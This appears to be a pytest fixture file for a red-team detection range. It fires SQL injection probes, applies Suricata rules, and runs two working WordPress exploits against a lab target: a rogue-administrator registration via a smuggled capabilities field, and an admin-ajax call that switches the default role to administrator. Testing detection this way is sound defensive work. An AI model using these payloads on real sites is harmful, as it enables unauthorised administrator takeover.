import json
import re
import time
import uuid
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone

import pytest
import requests

from conftest import (
    PLATFORM_URL, TARGET_PUBLIC, credited_to, from_attacker, run_redteam,
    score_when_ready, seen_by_both_engines, target_code,
)
from range import ATTACKER, BOARD, missing, run, substrate

CONTROL = "board-sqli-search"
UNION = "board-sqli-union-search"
BENIGN_SEARCH = "board-normal-search"
SQLMAP = "board-sqli-orderby-sqlmap"
LAST_ATTACK = "board-path-traversal-static"

NOISY_RULE = (
    '\nalert http any any -> any any (msg:"FSL deliberate false positive"; '
    'http.uri; content:"release"; nocase; sid:9009999; rev:1;)\n'
)
BUFFERLESS = (
    'alert http any any -> any any (msg:"FSL UNION without a buffer"; '
    'flow:established,to_server; content:"UNION"; nocase; sid:9009996; rev:1;)\n'
)
PORTED_RULE = 'alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"FSL ported SQLi probe"; flow:established,to_server; http.uri; pcre:"/(\\x27[\\s+]*(or|and)[\\s+]*[\\x27\\d]|union[\\s+]+select|--[\\s+]|\\x27[\\s+]*--|\\x27[\\s+]*\\x29)/i"; sid:9009996; rev:1;)\n'
NOT_A_RULE = "this is not a rule"

DETECT_WITHOUT_BLOCKING_SEARCH = {
    "paranoia": 1,
    "exclusions": [{"rule_id": 949110, "target": "", "path": "/search/"}],
}
FABRICATED_LOOT = [{"username": "admin", "password": "admin1234"}]

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')


def open_session(**settings) -> int:
    created = requests.post(f"{PLATFORM_URL}/api/sessions/", json=settings, timeout=600)
    assert created.status_code == 201, created.text
    return created.json()["id"]


def close_session(session_id):
    return requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
    )


@contextmanager
def shared_session(**settings):
    session_id = open_session(**settings)
    try:
        yield session_id
    finally:
        close_session(session_id)


def fire(session_id, case, origin=None, timeout=300):
    body = {"case": case} if origin is None else {"case": case, "origin": origin}
    return requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/", json=body, timeout=timeout,
    )


def fired_case_id(session_id, case, origin=None, timeout=300):
    sent = fire(session_id, case, origin, timeout)
    assert sent.status_code == 201, sent.text
    return sent.json()["case_id"]


def detections_of(session_id):
    return requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/detections/", timeout=120
    ).json()


def signatures(session_id):
    return {d["detection_id"]: d["signature"] for d in detections_of(session_id)}


def rules_of(session_id):
    return requests.get(
        f"{PLATFORM_URL}/api/rules/", params={"session": session_id}, timeout=60
    ).json()["content"]


def apply_rules(content, session_id):
    return requests.post(
        f"{PLATFORM_URL}/api/rules/apply/",
        json={"content": content, "session": session_id}, timeout=180,
    )


def auth_users_of(session_id):
    body = run(BOARD, [
        "python3", "-c",
        "import urllib.request,sys; "
        "sys.stdout.write(urllib.request.urlopen("
        "'http://127.0.0.1:8000/internal/auth-users', timeout=20).read().decode())",
    ], session=session_id).stdout
    return json.loads(body)


def alerts_mentioning(token, session, wait=90):
    deadline = time.time() + wait
    while True:
        requests.post(f"{PLATFORM_URL}/api/sessions/{session}/ingest/", timeout=120)
        found = [d for d in detections_of(session)
                 if d["source"] == "suricata" and token in (d.get("path") or "")]
        if found or time.time() >= deadline:
            return [requests.get(f"{PLATFORM_URL}/api/detections/{d['id']}/", timeout=60).json()["raw"]
                    for d in found]
        time.sleep(3)


def probed(session):
    token = f"zz{uuid.uuid4().hex[:10]}"
    from_attacker(f"/search/?q=%27%20OR%201%3D1--%20{token}", session=session)
    return alerts_mentioning(token, session)


def attack_from_the_shell(token, session):
    payload = f"/search/?q=%27%20OR%201%3D1--%20{token}"
    run(ATTACKER, ["sh", "-c", f'curl -s -o /dev/null --max-time 20 "$FSL_TARGET{payload}"'],
        session=session)
    return alerts_mentioning(token, session)


def typed(command, session_id):
    shell = f"printf '{command}\\nexit\\n' | bash -i"
    return run(ATTACKER, ["bash", "-c", shell], timeout=120, session=session_id)


def subnet_of(shape, segment):
    return next(s["subnet"] for s in shape["segments"] if s["id"] == segment)


@pytest.fixture(scope="session")
def full_run(stack_is_up):
    session_id = run_redteam()

    def ready(totals):
        if totals["tp"] <= 0:
            return False
        if {d["source"] for d in detections_of(session_id)} != {"suricata", "modsecurity"}:
            return False
        return seen_by_both_engines(session_id, totals, name=CONTROL) and bool(
            credited_to(session_id, totals, name=LAST_ATTACK))

    score = score_when_ready(session_id, until=ready)
    seen = {"session_id": session_id, "score": score, "detections": detections_of(session_id)}
    seen["topology"] = requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=120
    ).json()
    return seen


@pytest.fixture(scope="session")
def session_id(full_run):
    return full_run["session_id"]


@pytest.fixture(scope="session")
def score(full_run):
    return full_run["score"]


@pytest.fixture(scope="session")
def board_session(stack_is_up):
    with shared_session(scenario="board") as session_id:
        seen = {"session_id": session_id}
        seen["objectives_at_open"] = requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
        )
        seen["score_while_open"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        )
        seen["canary"] = requests.post(
            f"{PLATFORM_URL}/api/range/canary/", json={"session": session_id}, timeout=180
        )
        case_id = fired_case_id(session_id, CONTROL)
        seen["case_id"] = case_id
        loot = f"{PLATFORM_URL}/api/sessions/{session_id}/loot/"
        seen["fabricated_loot"] = requests.post(loot, json={"loot": FABRICATED_LOOT}, timeout=120)
        truth = auth_users_of(session_id)
        rows = [{"username": name, "hash": digest} for name, digest in truth.items()]
        seen["real_loot"] = requests.post(
            loot, json={"loot": rows, "case_id": case_id}, timeout=120
        )
        seen["closed"] = close_session(session_id)
        seen["score_once_closed"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        ).json()

        def fired_case(totals):
            return next((c for c in totals["per_case"] if c["case_id"] == case_id), {})

        seen["scored"] = score_when_ready(
            session_id, until=lambda t: bool(fired_case(t).get("detection_ids"))
        )
        seen["own"] = fired_case(seen["scored"])
    return seen


def origins_of(session_id):
    listed = requests.get(
        f"{PLATFORM_URL}/api/origins/", params={"session": session_id}, timeout=120
    )
    assert listed.status_code == 200, listed.text
    return listed.json()["origins"]


@pytest.fixture(scope="session")
def origins_session(stack_is_up):
    with shared_session() as session_id:
        origins = origins_of(session_id)
        elsewhere = next((o for o in origins if not o["default"]), None)
        places = (("front", ""),) + ((("elsewhere", elsewhere["id"]),) if elsewhere else ())
        case_ids = {place: fired_case_id(session_id, CONTROL, origin) for place, origin in places}
        rotated = [fire(session_id, CONTROL, "rotate") for _ in origins]
        tool = fire(session_id, SQLMAP, "hk", timeout=900)
        refused = fire(session_id, SQLMAP, "dmz", timeout=120)
        close_session(session_id)

        def all_seen_by_both(totals):
            return all(
                seen_by_both_engines(session_id, totals, case_id=case_id)
                for case_id in case_ids.values()
            )

        score = score_when_ready(session_id, until=all_seen_by_both)
        return {
            "session_id": session_id,
            "origins": origins,
            "sources": {
                place: {
                    d["src_ip"] for d in credited_to(session_id, score, case_id=case_id)
                    if d["src_ip"]
                }
                for place, case_id in case_ids.items()
            },
            "map": requests.get(
                f"{PLATFORM_URL}/api/sessions/{session_id}/map/", timeout=120
            ).json(),
            "rotated": rotated,
            "tool": tool,
            "refused": refused,
        }


@pytest.fixture(scope="session")
def tuned_session(stack_is_up):
    with shared_session() as session_id:
        tuned = requests.put(
            f"{PLATFORM_URL}/api/sessions/{session_id}/waf/",
            json=DETECT_WITHOUT_BLOCKING_SEARCH, timeout=120,
        )
        assert tuned.ok, tuned.text
        seen = {"session_id": session_id}
        for _ in range(30):
            reload_probe = f"/search/?q=%27%20OR%201%3D1--%20reload{uuid.uuid4().hex[:6]}"
            if target_code(reload_probe, session=session_id) != 403:
                break
            time.sleep(1)
        seen["estate"] = subnet_of(requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=60
        ).json(), "estate")
        case_id = fired_case_id(session_id, CONTROL)
        close_session(session_id)

        score = score_when_ready(
            session_id, until=lambda totals: seen_by_both_engines(session_id, totals, case_id=case_id)
        )
        seen["own"] = {
            d["src_ip"] for d in credited_to(session_id, score, case_id=case_id) if d["src_ip"]
        }
        seen["map"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/map/", timeout=120
        ).json()
        seen["listed"] = detections_of(session_id)
    return seen


@pytest.fixture(scope="session")
def rules_session(stack_is_up, baseline_rules):
    with shared_session() as session_id:
        seen = {"session_id": session_id}
        seen["rules_before_invalid"] = rules_of(session_id)
        seen["invalid"] = apply_rules(NOT_A_RULE, session_id)
        seen["rules_after_invalid"] = rules_of(session_id)

        applied = apply_rules(BUFFERLESS, session_id)
        assert applied.ok, applied.text
        union = fired_case_id(session_id, UNION)

        def credited(totals):
            owned = next((c for c in totals["per_case"] if c["case_id"] == union), {})
            sigs = signatures(session_id)
            return any(sigs.get(d, "").startswith("FSL UNION without a buffer")
                       for d in owned.get("detection_ids", []))

        seen["bufferless"] = (
            score_when_ready(session_id, until=credited), union, signatures(session_id)
        )

        seen["noisy"] = apply_rules(baseline_rules + PORTED_RULE + NOISY_RULE, session_id)
        assert seen["noisy"].ok, seen["noisy"].text
        for name in (CONTROL, UNION, BENIGN_SEARCH):
            fired_case_id(session_id, name)
        close_session(session_id)

        seen["after"] = score_when_ready(
            session_id, until=lambda totals: totals["tp"] > 0 and totals["fp"] > 0
        )
        seen["listed"] = detections_of(session_id)
    return seen


@pytest.fixture(scope="session")
def terminal_session(stack_is_up):
    with shared_session() as session_id:
        seen = {"session_id": session_id}
        seen["box"] = dict(
            requests.get(
                f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=120
            ).json(),
            session=session_id,
        )
        seen["box_addresses"] = run(
            ATTACKER, ["sh", "-c", "hostname -I"], session=session_id
        ).stdout.split()
        seen["front"] = probed(session_id)

        marker = str(uuid.uuid4())
        label = f"{PLATFORM_URL}/api/attacker/label/"
        requests.post(label, json={"case_id": marker, "session": session_id}, timeout=60)
        try:
            typed("nmap --version", session_id)
        finally:
            requests.post(label, json={"case_id": None, "session": session_id}, timeout=60)
        typed("echo after", session_id)
        seen["marker"] = marker
        seen["commands"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/commands/", timeout=120
        )

        seen["elsewhere"] = next(
            (o for o in origins_of(session_id) if not o["default"]), None)
        if seen["elsewhere"]:
            origin = f"{PLATFORM_URL}/api/attacker/origin/"
            token = f"zz{uuid.uuid4().hex[:8]}"
            try:
                requests.post(origin, json={"origin": seen["elsewhere"]["id"], "session": session_id},
                              timeout=60)
                seen["moved"] = (token, attack_from_the_shell(token, session_id))
            finally:
                requests.post(origin, json={"origin": "", "session": session_id}, timeout=60)
    return seen


def admin_ids(session=None):
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
        "AND meta_value LIKE '%administrator%';",
    ], session=session).stdout
    return {int(x) for x in out.split()}


def register_nonce(session=None):
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/register/",
    ], session=session).stdout
    found = NONCE.search(page)
    assert found, "no _wpnonce on the live UM register form; is corp-wp up?"
    return found.group(1)


def submit_registration(nonce, login, session=None):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", "form_id=5",
        "--data", "um_request=",
        "--data", f"_wpnonce={nonce}",
        "--data", "_wp_http_referer=/register/",
        "--data", f"user_login-5={login}",
        "--data", "first_name-5=North",
        "--data", "last_name-5=Wind",
        "--data", f"user_email-5={login}@example.com",
        "--data", "user_password-5=Str0ng-Pass-9271",
        "--data", "confirm_user_password-5=Str0ng-Pass-9271",
        "--data", ROGUE_KEY,
        f"{TARGET_PUBLIC}/register/",
    ], session=session).stdout.strip()


def delete_user(uid, session=None):
    run(CORP, ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"],
        session=session)


def option(name, session=None):
    return run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT option_value FROM wp_options WHERE option_name='{name}';",
    ], session=session).stdout.strip()


def set_option(name, value, session=None):
    run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
        f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';",
    ], session=session)


def ajax_nonce(session=None):
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}/",
    ], session=session).stdout
    found = AJAX_NONCE.search(page)
    assert found, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
    return found.group(1)


def flip(security, name, value, session=None):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", f'data={{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}',
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={security}",
    ], session=session).stdout.strip()


def corp_is_declared():
    absent = missing(CORP, CORP_DB)
    assert not absent, (
        f"the corp wargame is not on this range (substrate {substrate()}): "
        f"{', '.join(absent)} {'has' if len(absent) == 1 else 'have'} no host "
        f"in platform/range/declaration.yaml for it, so nothing builds or boots "
        f"the target and the live exploit has nothing to change"
    )


def record_corp_window(session_id, name, fired_at, done_at):
    recorded = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
        json={
            "case_id": f"{name}-{uuid.uuid4().hex[:8]}",
            "name": name,
            "malicious": True,
            "correlation": "marker",
            "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
            "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
        },
        timeout=60,
    )
    assert recorded.status_code == 201, recorded.text


def judged_corp(session_id):
    return {
        "observed": requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120
        ).json(),
        "credited": {o["key"] for o in requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
        ).json()},
        "score": requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        ).json(),
    }


@pytest.fixture(scope="session")
def rogue_admin_session(stack_is_up):
    corp_is_declared()
    with shared_session(scenario="corp") as session_id:
        baseline = admin_ids(session_id)
        seen = {"session_id": session_id, "baseline": baseline, "created": set()}
        try:
            time.sleep(2)
            fired_at = datetime.now(timezone.utc)
            seen["code"] = submit_registration(
                register_nonce(session_id), f"rogue_{uuid.uuid4().hex[:8]}", session_id
            )
            done_at = datetime.now(timezone.utc)
            seen["admins"] = admin_ids(session_id)
            seen["created"] = seen["admins"] - baseline
            record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at)
            seen.update(judged_corp(session_id))
        finally:
            for uid in sorted(seen["created"]):
                delete_user(uid, session_id)
            seen["admins_left"] = admin_ids(session_id)
    return seen


@pytest.fixture(scope="session")
def option_flip_session(stack_is_up):
    corp_is_declared()
    with shared_session(scenario="corp") as session_id:
        seen = {"session_id": session_id}
        try:
            time.sleep(2)
            fired_at = datetime.now(timezone.utc)
            security = ajax_nonce(session_id)
            seen["flips"] = (
                flip(security, "users_can_register", "1", session_id),
                flip(security, "default_role", "administrator", session_id),
            )
            seen["registration_open"] = option("users_can_register", session_id)
            seen["default_role"] = option("default_role", session_id)
            done_at = datetime.now(timezone.utc)
            record_corp_window(session_id, "corp-self-registration", fired_at, done_at)
            seen.update(judged_corp(session_id))
        finally:
            set_option("users_can_register", "0", session_id)
            set_option("default_role", "subscriber", session_id)
            seen["options_left"] = (
                option("users_can_register", session_id), option("default_role", session_id)
            )
    return seen
